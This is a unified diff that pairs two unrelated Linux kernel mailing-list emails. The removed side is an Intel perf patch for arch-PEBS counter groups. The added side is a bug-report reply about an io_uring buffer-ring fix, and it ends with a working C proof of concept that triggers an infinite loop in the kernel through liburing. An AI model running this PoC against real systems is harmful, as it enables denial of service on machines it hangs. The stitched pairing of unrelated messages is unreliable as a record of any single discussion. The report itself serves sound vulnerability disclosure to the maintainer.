@@ -1,83 +1,74 @@
-Return-Path: <linux-kernel+bounces-789101-lists+linux-kernel=lfdr.de@vger.kernel.org>
+Return-Path: <linux-kernel+bounces-789102-lists+linux-kernel=lfdr.de@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
-	by mail.lfdr.de (Postfix) with ESMTPS id 1778FB39126
-	for <lists+linux-kernel@lfdr.de>; Thu, 28 Aug 2025 03:38:31 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 89CB1B39128
+	for <lists+linux-kernel@lfdr.de>; Thu, 28 Aug 2025 03:38:45 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by am.mirrors.kernel.org (Postfix) with ESMTPS id 32CC51C21116
-	for <lists+linux-kernel@lfdr.de>; Thu, 28 Aug 2025 01:38:51 +0000 (UTC)
+	by am.mirrors.kernel.org (Postfix) with ESMTPS id 7F3C21C217EF
+	for <lists+linux-kernel@lfdr.de>; Thu, 28 Aug 2025 01:39:05 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id EE08625A331;
-	Thu, 28 Aug 2025 01:36:35 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 92EDA212B0A;
+	Thu, 28 Aug 2025 01:37:13 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="ftQQyz26"
-Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.13])
+	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="t9bCdBOf"
+Received: from out203-205-221-236.mail.qq.com (out203-205-221-236.mail.qq.com [203.205.221.236])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5BF5F225403;
-	Thu, 28 Aug 2025 01:36:33 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=192.198.163.13
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 89C4221773D;
+	Thu, 28 Aug 2025 01:37:08 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.236
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1756344995; cv=none; b=JhlUOw4vkDszCuqiGMaHLUzbrGbCj5oxQiRjHqZ6w7Ov7c06dBwJnFqKpcq4lRxWR5aD3XHrvU/9fmYOT1hpwNWMzf4vaw9Ux2irw4L9aE4Ahebt2Fv63AMrkC1cVGSS8B/AcQWS3faRVeqwAvnZolkFceOk7BNIyzO82V7OhWQ=
+	t=1756345032; cv=none; b=elb7JqUVtrIjyqN5qVRRZgtDsNYNE++6rNxRe+hLEmpVJ/lV0nmGjbFjd9vH/c6yyOc6BIDP2xY3YoS4JOho89q1tpztYfaXoxCoFXhwdhF2SdHUTGi86Vp5XDnsBheXfXGriYB8ad6Z19sxQGaJZip2eTR10/jorrqhbabg+W8=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1756344995; c=relaxed/simple;
-	bh=vWp+U2YkqGR0EfcX7to5BPaf4xkI/jtvvLgjJaPfmAs=;
-	h=From:To:Cc:Subject:Date:Message-Id:In-Reply-To:References:
-	 MIME-Version; b=D9NwLw0gjTydPlyiZr4XS6WKqb//bB9pMMqVF2T/FTLBFl9olRUIDd6rEVMPpJ3bqNT5s3nxYidBxIxKG7Qm8fBUGVanjGZTlajso2iMjaiWwAIktmYIB1mgDRqZIhGc/Bot5lNIeX3qXTx6lAfR6S1jNpLZ1l6Cea3YaP/3SUY=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.intel.com; spf=none smtp.mailfrom=linux.intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=ftQQyz26; arc=none smtp.client-ip=192.198.163.13
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.intel.com
-Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=linux.intel.com
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
-  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
-  t=1756344993; x=1787880993;
-  h=from:to:cc:subject:date:message-id:in-reply-to:
-   references:mime-version:content-transfer-encoding;
-  bh=vWp+U2YkqGR0EfcX7to5BPaf4xkI/jtvvLgjJaPfmAs=;
-  b=ftQQyz26gk5U0hbw3hoZFBdGvfIxyL6dZRnTMQG1WGf/NMFSqrBuTU/l
-   Zg5WRIDZ3Y5TPbUQIilQQ37xLm0KHqmZQM8peC+uA6PRh7n0KpKvo/I6r
-   bAWUZ4uoN26E0l46E+v5DIpGyEoqSD6mpWUKJIMb3m8eULhWH/rvrzAWa
-   sCjv6qx1B4p+J+WhA2igDu1KURYF26pLdw8CAbGCxm6BNXIII0Lhsn8KK
-   QC2DjZ2wdvMXOcTTF32qHP7+GVeP2bYoRJw5QHgC2k/kvWY05s4Q3eUjZ
-   TdESkq5yL6OSwSPJwWpVFuIFghlznLhS8vn9cfw1OV2js/+QU0Jq2SgJK
-   A==;
-X-CSE-ConnectionGUID: 8TjAcGL6RLmR2URb54gK3g==
-X-CSE-MsgGUID: K33jTiGmQ0O4t6PEsDdmdA==
-X-IronPort-AV: E=McAfee;i="6800,10657,11535"; a="61240976"
-X-IronPort-AV: E=Sophos;i="6.18,217,1751266800"; 
-   d="scan'208";a="61240976"
-Received: from fmviesa008.fm.intel.com ([10.60.135.148])
-  by fmvoesa107.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 27 Aug 2025 18:36:33 -0700
-X-CSE-ConnectionGUID: dzV5rIkZS0OsxDmO8XloiA==
-X-CSE-MsgGUID: FVv29Hh6Tga761gfLoOGUw==
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="6.18,217,1751266800"; 
-   d="scan'208";a="170372620"
-Received: from spr.sh.intel.com ([10.112.230.239])
-  by fmviesa008.fm.intel.com with ESMTP; 27 Aug 2025 18:36:30 -0700
-From: Dapeng Mi <dapeng1.mi@linux.intel.com>
-To: Peter Zijlstra <peterz@infradead.org>,
-	Ingo Molnar <mingo@redhat.com>,
-	Arnaldo Carvalho de Melo <acme@kernel.org>,
-	Namhyung Kim <namhyung@kernel.org>,
-	Ian Rogers <irogers@google.com>,
-	Adrian Hunter <adrian.hunter@intel.com>,
-	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
-	Kan Liang <kan.liang@linux.intel.com>,
-	Andi Kleen <ak@linux.intel.com>,
-	Eranian Stephane <eranian@google.com>
-Cc: linux-kernel@vger.kernel.org,
-	linux-perf-users@vger.kernel.org,
-	Dapeng Mi <dapeng1.mi@intel.com>,
-	Dapeng Mi <dapeng1.mi@linux.intel.com>
-Subject: [Patch v7 12/12] perf/x86/intel: Add counter group support for arch-PEBS
-Date: Thu, 28 Aug 2025 09:34:35 +0800
-Message-Id: <20250828013435.1528459-13-dapeng1.mi@linux.intel.com>
-X-Mailer: git-send-email 2.34.1
-In-Reply-To: <20250828013435.1528459-1-dapeng1.mi@linux.intel.com>
-References: <20250828013435.1528459-1-dapeng1.mi@linux.intel.com>
+	s=arc-20240116; t=1756345032; c=relaxed/simple;
+	bh=4HrtJyCgz5outgZsrWreunen6H5khAGfYNYvkKjkRV0=;
+	h=Message-ID:From:To:Cc:Subject:Date:In-Reply-To:References:
+	 MIME-Version; b=DbesPPmXbSuyO1OcHI5CjZEtiIw1cKzj/Kx8vtL9UUzvyS8QUF6PrXKpZIUDLhpc3rAkJ37yEKdWdP2myIisjgXscRk1jTXa0b+JaSFD3KJJ/eXyVwQ/bT6tSP/y+b1h5beB/O7dpqTW+PMb+yEb95HnqfYgTp+LflJss1eVZhs=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=t9bCdBOf; arc=none smtp.client-ip=203.205.221.236
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
+	t=1756345021; bh=/sr+eSuAYU3WbwRQK33VHOQJ6d8mU+6xKUUv6PfTlaM=;
+	h=From:To:Cc:Subject:Date:In-Reply-To:References;
+	b=t9bCdBOfS2rs68fVrFlyf3ArlBmybw2LSKarIxlurf3oAM3LFY+UqUb6sThEQXPys
+	 RzEa6XTR5LQipN02rnBDj+3Yd6jz7e6pcnVr/heHvkY6wnOlIirr6Sp3VnK7ozPT8M
+	 j5fUi2fHul0LsX4uxRrGKLX550LamBC95FW/V6zo=
+Received: from nebula-bj.localdomain ([223.104.40.195])
+	by newxmesmtplogicsvrszb42-0.qq.com (NewEsmtp) with SMTP
+	id 93ABE854; Thu, 28 Aug 2025 09:36:58 +0800
+X-QQ-mid: xmsmtpt1756345018t2irkinp4
+Message-ID: <tencent_2DEFFED135071FB225305A65D1688B303A09@qq.com>
+X-QQ-XMAILINFO: MllZffuBkEb5Szf0QZGBMmOVO0N411OCOvRYQBqGmUAd+7N/epmnsE9IC5Mbzh
+	 O3WKNeUY8LoL6LNqJSSY0cVW1ubeTnRVD8WL64RayKq5PJ4fZVRW+psZYNl1EaCQsr/x9VolDjm2
+	 3XhCdqsNmY28UDqNiyYYXzwf1m41A8LiMFElZV8BOxsfxpYsQ0jlVjWzkcBAcF7Y1tQ++QckvbAR
+	 gIvs5qdZKwMLYYK6BKKg8twkYQR+8TmrTS3FtXD3SRVWvOXd06PIN6ZaU40ODWXpEw1JDJDRY8K8
+	 6wRCkMFSJtpc1lbL+IsEAzBy/GjVeVDb3BHiGdfgzanKHbuC+eMfG8mO85jENAjWv0E+7WNnsxAn
+	 xKmbmqC1mzi1naMP/dinYR19ODvnn+FUA+d96F5iBxwY0X9RaKoKumBkdoD3JDiQ+LybExbjizvu
+	 WGTZibQNMnrTgxOHWyOPB1UH9dd8wx0SDr0ffWXnZYGEBPAJbn8NzFGtsXragJUGryMglRvCys76
+	 3LmknweCydn+KZ5RdoYaxEg1w1zvi00mz9Ne5jO2nHhZnmNhh9LQRc1Yjjreuj2MLohLryWRJYbu
+	 1GmqOasRS31Uf7BFwUFksA6q2I7cF9DthNa18CycsDTDkp6pesmj8a+kGQYoar06oscoYgR8T35V
+	 9sNEbZM8xpY4o2M8G4IBNaaXoQLOe3hkxLyKULto65eZZl6h/InAeJQ8QsYYNt2l1zBAbmAP9jH3
+	 JKaC4yz4/0k0bgqVZxJQpAqVro3Hxai9iIvP4xEMZzdEiPGd4eNv71VM7MObTaCFTWrWN1aQCxIp
+	 j+saWvZcSdlhWiPclI0AHDQO+ag5BBurXJgKNjQMPBzDf0sqW4e+X9tWFOAXqsou7/PVy8NpUtr3
+	 5gIGRDJkOA7H0X9cMQ7gzPUcAkO2pEguoU0ufu6nPbK1vs1gQB8RFNHzLUPqG5g3gyWgg3kWA/Vy
+	 lPMNBryuKSYr4dgMC1GEi7k5GU0bwpBZY+AAzj3qfkQwIOi+BMAWW/v8/fOYe6O/4qZDBvSYi4UW
+	 dPT8pE8T2xnekm62KIgvnLiAy3c4KMKGPqKGkcMROG1KMgJZADtjTky0V+HTG9AbmBRljWVQ==
+X-QQ-XMRINFO: OD9hHCdaPRBwq3WW+NvGbIU=
+From: Qingyue Zhang <chunzhennn@qq.com>
+To: axboe@kernel.dk
+Cc: aftern00n@qq.com,
+	chunzhennn@qq.com,
+	io-uring@vger.kernel.org,
+	linux-kernel@vger.kernel.org
+Subject: Re: [PATCH 2/2] io_uring/kbuf: fix infinite loop in io_kbuf_inc_commit()
+Date: Thu, 28 Aug 2025 09:36:58 +0800
+X-OQ-MSGID: <20250828013658.29061-1-chunzhennn@qq.com>
+X-Mailer: git-send-email 2.48.1
+In-Reply-To: <4b8eb795-239f-4f46-af4f-7a05056ab516@kernel.dk>
+References: <4b8eb795-239f-4f46-af4f-7a05056ab516@kernel.dk>
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
@@ -86,228 +77,127 @@ List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Base on previous adaptive PEBS counter snapshot support, add counter
-group support for architectural PEBS. Since arch-PEBS shares same
-counter group layout with adaptive PEBS, directly reuse
-__setup_pebs_counter_group() helper to process arch-PEBS counter group.
+On 2025-08-27 21:45 UTC, Jens Axboe wrote:
+> I took a closer look and there's another spot where we should be
+> using READ_ONCE() to get the buffer length. How about something like
+> the below rather than the loop work-around?
+> 
+> 
+> commit 7f472373b2855087ae2df9dc6a923f3016a1ed21
+> Author: Jens Axboe <axboe@kernel.dk>
+> Date:   Wed Aug 27 15:27:30 2025 -0600
+> 
+>     io_uring/kbuf: always use READ_ONCE() to read ring provided buffer lengths
+>     
+>     Since the buffers are mapped from userspace, it is prudent to use
+>     READ_ONCE() to read the value into a local variable, and use that for
+>     any other actions taken. Having a stable read of the buffer length
+>     avoids worrying about it changing after checking, or being read multiple
+>     times.
+>     
+>     Fixes: c7fb19428d67 ("io_uring: add support for ring mapped supplied buffers")
+>     Link: https://lore.kernel.org/io-uring/tencent_000C02641F6250C856D0C26228DE29A3D30A@qq.com/
+>     Reported-by: Qingyue Zhang <chunzhennn@qq.com>
+>     Signed-off-by: Jens Axboe <axboe@kernel.dk>
+> 
+> diff --git a/io_uring/kbuf.c b/io_uring/kbuf.c
+> index 81a13338dfab..394037d3f2f6 100644
+> --- a/io_uring/kbuf.c
+> +++ b/io_uring/kbuf.c
+> @@ -36,15 +36,18 @@ static bool io_kbuf_inc_commit(struct io_buffer_list *bl, int len)
+>  {
+>  	while (len) {
+>  		struct io_uring_buf *buf;
+> -		u32 this_len;
+> +		u32 buf_len, this_len;
+>  
+>  		buf = io_ring_head_to_buf(bl->buf_ring, bl->head, bl->mask);
+> -		this_len = min_t(u32, len, buf->len);
+> -		buf->len -= this_len;
+> -		if (buf->len) {
+> +		buf_len = READ_ONCE(buf->len);
+> +		this_len = min_t(u32, len, buf_len);
+> +		buf_len -= this_len;
+> +		if (buf_len) {
+>  			buf->addr += this_len;
+> +			buf->len = buf_len;
+>  			return false;
+>  		}
+> +		buf->len = 0;
+>  		bl->head++;
+>  		len -= this_len;
+>  	}
+> @@ -159,6 +162,7 @@ static void __user *io_ring_buffer_select(struct io_kiocb *req, size_t *len,
+>  	__u16 tail, head = bl->head;
+>  	struct io_uring_buf *buf;
+>  	void __user *ret;
+> +	u32 buf_len;
+>  
+>  	tail = smp_load_acquire(&br->tail);
+>  	if (unlikely(tail == head))
+> @@ -168,8 +172,9 @@ static void __user *io_ring_buffer_select(struct io_kiocb *req, size_t *len,
+>  		req->flags |= REQ_F_BL_EMPTY;
+>  
+>  	buf = io_ring_head_to_buf(br, head, bl->mask);
+> -	if (*len == 0 || *len > buf->len)
+> -		*len = buf->len;
+> +	buf_len = READ_ONCE(buf->len);
+> +	if (*len == 0 || *len > buf_len)
+> +		*len = buf_len;
+>  	req->flags |= REQ_F_BUFFER_RING | REQ_F_BUFFERS_COMMIT;
+>  	req->buf_list = bl;
+>  	req->buf_index = buf->bid;
+> @@ -265,7 +270,7 @@ static int io_ring_buffers_peek(struct io_kiocb *req, struct buf_sel_arg *arg,
+>  
+>  	req->buf_index = buf->bid;
+>  	do {
+> -		u32 len = buf->len;
+> +		u32 len = READ_ONCE(buf->len);
+>  
+>  		/* truncate end piece, if needed, for non partial buffers */
+>  		if (len > arg->max_len) {
 
-Signed-off-by: Dapeng Mi <dapeng1.mi@linux.intel.com>
----
- arch/x86/events/intel/core.c      | 38 ++++++++++++++++++++++++++++---
- arch/x86/events/intel/ds.c        | 29 ++++++++++++++++++++---
- arch/x86/include/asm/msr-index.h  |  6 +++++
- arch/x86/include/asm/perf_event.h | 13 ++++++++---
- 4 files changed, 77 insertions(+), 9 deletions(-)
+I'm afraid this doesn't solve the problem. the value of buf->len
+could be changed before the function is called. Maybe we shouldn't
+trust it at all?
 
-diff --git a/arch/x86/events/intel/core.c b/arch/x86/events/intel/core.c
-index c8cd490aa539..52bf3b4bc938 100644
---- a/arch/x86/events/intel/core.c
-+++ b/arch/x86/events/intel/core.c
-@@ -3014,6 +3014,17 @@ static void intel_pmu_enable_event_ext(struct perf_event *event)
- 
- 			if (pebs_data_cfg & PEBS_DATACFG_LBRS)
- 				ext |= ARCH_PEBS_LBR & cap.caps;
-+
-+			if (pebs_data_cfg &
-+			    (PEBS_DATACFG_CNTR_MASK << PEBS_DATACFG_CNTR_SHIFT))
-+				ext |= ARCH_PEBS_CNTR_GP & cap.caps;
-+
-+			if (pebs_data_cfg &
-+			    (PEBS_DATACFG_FIX_MASK << PEBS_DATACFG_FIX_SHIFT))
-+				ext |= ARCH_PEBS_CNTR_FIXED & cap.caps;
-+
-+			if (pebs_data_cfg & PEBS_DATACFG_METRICS)
-+				ext |= ARCH_PEBS_CNTR_METRICS & cap.caps;
- 		}
- 
- 		if (cpuc->n_pebs == cpuc->n_large_pebs)
-@@ -3038,6 +3049,9 @@ static void intel_pmu_enable_event_ext(struct perf_event *event)
- 		}
- 	}
- 
-+	if (is_pebs_counter_event_group(event))
-+		ext |= ARCH_PEBS_CNTR_ALLOW;
-+
- 	if (cpuc->cfg_c_val[hwc->idx] != ext)
- 		__intel_pmu_update_event_ext(hwc->idx, ext);
- }
-@@ -4323,6 +4337,20 @@ static bool intel_pmu_is_acr_group(struct perf_event *event)
- 	return false;
- }
- 
-+static inline bool intel_pmu_has_pebs_counter_group(struct pmu *pmu)
-+{
-+	u64 caps;
-+
-+	if (x86_pmu.intel_cap.pebs_format >= 6 && x86_pmu.intel_cap.pebs_baseline)
-+		return true;
-+
-+	caps = hybrid(pmu, arch_pebs_cap).caps;
-+	if (x86_pmu.arch_pebs && (caps & ARCH_PEBS_CNTR_MASK))
-+		return true;
-+
-+	return false;
-+}
-+
- static inline void intel_pmu_set_acr_cntr_constr(struct perf_event *event,
- 						 u64 *cause_mask, int *num)
- {
-@@ -4471,8 +4499,7 @@ static int intel_pmu_hw_config(struct perf_event *event)
- 	}
- 
- 	if ((event->attr.sample_type & PERF_SAMPLE_READ) &&
--	    (x86_pmu.intel_cap.pebs_format >= 6) &&
--	    x86_pmu.intel_cap.pebs_baseline &&
-+	    intel_pmu_has_pebs_counter_group(event->pmu) &&
- 	    is_sampling_event(event) &&
- 	    event->attr.precise_ip)
- 		event->group_leader->hw.flags |= PERF_X86_EVENT_PEBS_CNTR;
-@@ -5420,6 +5447,8 @@ static inline void __intel_update_large_pebs_flags(struct pmu *pmu)
- 	x86_pmu.large_pebs_flags |= PERF_SAMPLE_TIME;
- 	if (caps & ARCH_PEBS_LBR)
- 		x86_pmu.large_pebs_flags |= PERF_SAMPLE_BRANCH_STACK;
-+	if (caps & ARCH_PEBS_CNTR_MASK)
-+		x86_pmu.large_pebs_flags |= PERF_SAMPLE_READ;
- 
- 	if (!(caps & ARCH_PEBS_AUX))
- 		x86_pmu.large_pebs_flags &= ~PERF_SAMPLE_DATA_SRC;
-@@ -7133,8 +7162,11 @@ __init int intel_pmu_init(void)
- 	 * Many features on and after V6 require dynamic constraint,
- 	 * e.g., Arch PEBS, ACR.
- 	 */
--	if (version >= 6)
-+	if (version >= 6) {
- 		x86_pmu.flags |= PMU_FL_DYN_CONSTRAINT;
-+		x86_pmu.late_setup = intel_pmu_late_setup;
-+	}
-+
- 	/*
- 	 * Install the hw-cache-events table:
- 	 */
-diff --git a/arch/x86/events/intel/ds.c b/arch/x86/events/intel/ds.c
-index f62ca4f266d5..65908880f424 100644
---- a/arch/x86/events/intel/ds.c
-+++ b/arch/x86/events/intel/ds.c
-@@ -1530,13 +1530,20 @@ pebs_update_state(bool needed_cb, struct cpu_hw_events *cpuc,
- 
- u64 intel_get_arch_pebs_data_config(struct perf_event *event)
- {
-+	struct cpu_hw_events *cpuc = this_cpu_ptr(&cpu_hw_events);
- 	u64 pebs_data_cfg = 0;
-+	u64 cntr_mask;
- 
- 	if (WARN_ON(event->hw.idx < 0 || event->hw.idx >= X86_PMC_IDX_MAX))
- 		return 0;
- 
- 	pebs_data_cfg |= pebs_update_adaptive_cfg(event);
- 
-+	cntr_mask = (PEBS_DATACFG_CNTR_MASK << PEBS_DATACFG_CNTR_SHIFT) |
-+		    (PEBS_DATACFG_FIX_MASK << PEBS_DATACFG_FIX_SHIFT) |
-+		    PEBS_DATACFG_CNTR | PEBS_DATACFG_METRICS;
-+	pebs_data_cfg |= cpuc->pebs_data_cfg & cntr_mask;
-+
- 	return pebs_data_cfg;
- }
- 
-@@ -2441,6 +2448,24 @@ static void setup_arch_pebs_sample_data(struct perf_event *event,
- 		}
- 	}
- 
-+	if (header->cntr) {
-+		struct arch_pebs_cntr_header *cntr = next_record;
-+		unsigned int nr;
-+
-+		next_record += sizeof(struct arch_pebs_cntr_header);
-+
-+		if (is_pebs_counter_event_group(event)) {
-+			__setup_pebs_counter_group(cpuc, event,
-+				(struct pebs_cntr_header *)cntr, next_record);
-+			data->sample_flags |= PERF_SAMPLE_READ;
-+		}
-+
-+		nr = hweight32(cntr->cntr) + hweight32(cntr->fixed);
-+		if (cntr->metrics == INTEL_CNTR_METRICS)
-+			nr += 2;
-+		next_record += nr * sizeof(u64);
-+	}
-+
- 	/* Parse followed fragments if there are. */
- 	if (arch_pebs_record_continued(header)) {
- 		at = at + header->size;
-@@ -3111,10 +3136,8 @@ static void __init intel_ds_pebs_init(void)
- 			break;
- 
- 		case 6:
--			if (x86_pmu.intel_cap.pebs_baseline) {
-+			if (x86_pmu.intel_cap.pebs_baseline)
- 				x86_pmu.large_pebs_flags |= PERF_SAMPLE_READ;
--				x86_pmu.late_setup = intel_pmu_late_setup;
--			}
- 			fallthrough;
- 		case 5:
- 			x86_pmu.pebs_ept = 1;
-diff --git a/arch/x86/include/asm/msr-index.h b/arch/x86/include/asm/msr-index.h
-index 737d51629c03..41852e8690d7 100644
---- a/arch/x86/include/asm/msr-index.h
-+++ b/arch/x86/include/asm/msr-index.h
-@@ -331,12 +331,18 @@
- #define ARCH_PEBS_INDEX_WR_SHIFT	4
- 
- #define ARCH_PEBS_RELOAD		0xffffffff
-+#define ARCH_PEBS_CNTR_ALLOW		BIT_ULL(35)
-+#define ARCH_PEBS_CNTR_GP		BIT_ULL(36)
-+#define ARCH_PEBS_CNTR_FIXED		BIT_ULL(37)
-+#define ARCH_PEBS_CNTR_METRICS		BIT_ULL(38)
- #define ARCH_PEBS_LBR_SHIFT		40
- #define ARCH_PEBS_LBR			(0x3ull << ARCH_PEBS_LBR_SHIFT)
- #define ARCH_PEBS_VECR_XMM		BIT_ULL(49)
- #define ARCH_PEBS_GPR			BIT_ULL(61)
- #define ARCH_PEBS_AUX			BIT_ULL(62)
- #define ARCH_PEBS_EN			BIT_ULL(63)
-+#define ARCH_PEBS_CNTR_MASK		(ARCH_PEBS_CNTR_GP | ARCH_PEBS_CNTR_FIXED | \
-+					 ARCH_PEBS_CNTR_METRICS)
- 
- #define MSR_IA32_RTIT_CTL		0x00000570
- #define RTIT_CTL_TRACEEN		BIT(0)
-diff --git a/arch/x86/include/asm/perf_event.h b/arch/x86/include/asm/perf_event.h
-index 3b3848f0d339..7276ba70c88a 100644
---- a/arch/x86/include/asm/perf_event.h
-+++ b/arch/x86/include/asm/perf_event.h
-@@ -141,16 +141,16 @@
- #define ARCH_PERFMON_EVENTS_COUNT			7
- 
- #define PEBS_DATACFG_MEMINFO	BIT_ULL(0)
--#define PEBS_DATACFG_GP	BIT_ULL(1)
-+#define PEBS_DATACFG_GP		BIT_ULL(1)
- #define PEBS_DATACFG_XMMS	BIT_ULL(2)
- #define PEBS_DATACFG_LBRS	BIT_ULL(3)
--#define PEBS_DATACFG_LBR_SHIFT	24
- #define PEBS_DATACFG_CNTR	BIT_ULL(4)
-+#define PEBS_DATACFG_METRICS	BIT_ULL(5)
-+#define PEBS_DATACFG_LBR_SHIFT	24
- #define PEBS_DATACFG_CNTR_SHIFT	32
- #define PEBS_DATACFG_CNTR_MASK	GENMASK_ULL(15, 0)
- #define PEBS_DATACFG_FIX_SHIFT	48
- #define PEBS_DATACFG_FIX_MASK	GENMASK_ULL(7, 0)
--#define PEBS_DATACFG_METRICS	BIT_ULL(5)
- 
- /* Steal the highest bit of pebs_data_cfg for SW usage */
- #define PEBS_UPDATE_DS_SW	BIT_ULL(63)
-@@ -603,6 +603,13 @@ struct arch_pebs_lbr_header {
- 	u64 ler_info;
- };
- 
-+struct arch_pebs_cntr_header {
-+	u32 cntr;
-+	u32 fixed;
-+	u32 metrics;
-+	u32 reserved;
-+};
-+
- /*
-  * AMD Extended Performance Monitoring and Debug cpuid feature detection
-  */
--- 
-2.34.1
+Here is a PoC that can still trigger infinite loop:
+
+#include<liburing.h>
+#include<liburing/io_uring.h>
+#include<netinet/in.h>
+#include<stdint.h>
+#include<sys/socket.h>
+#include<arpa/inet.h>
+#include<stdlib.h>
+int main(){
+    struct io_uring ring;
+    struct io_uring_buf* buf_info;
+
+    posix_memalign((void**)&buf_info, 4096, 4096);
+    char* buf = malloc(0x1000);
+    struct io_uring_buf_reg reg = {
+        .ring_addr = (uint64_t)buf_info,
+        .ring_entries = 2
+    };
+    buf_info[0].addr = (uint64_t)buf_info;
+    buf_info[0].len = 0x1000;
+    buf_info[0].bid = 0;
+    buf_info[0].resv = 1; // tail
+    io_uring_queue_init(0x10, &ring, IORING_SETUP_NO_SQARRAY);
+    io_uring_register_buf_ring(&ring, &reg, IOU_PBUF_RING_INC);
+
+    int fds[2];
+    socketpair(AF_UNIX, SOCK_DGRAM, 0, fds);
+    void* send_buf = calloc(1, 32);
+    send(fds[0], send_buf, 32, MSG_DONTWAIT);
+
+    struct io_uring_sqe* sqe = io_uring_get_sqe(&ring);
+    io_uring_prep_recv(sqe, fds[1], NULL, 0, 0);
+    sqe->flags |=  1<<IOSQE_BUFFER_SELECT_BIT;
+    io_uring_submit(&ring);
+    struct io_uring_cqe* cqe;
+    io_uring_wait_cqe(&ring, &cqe);
+}
 
 
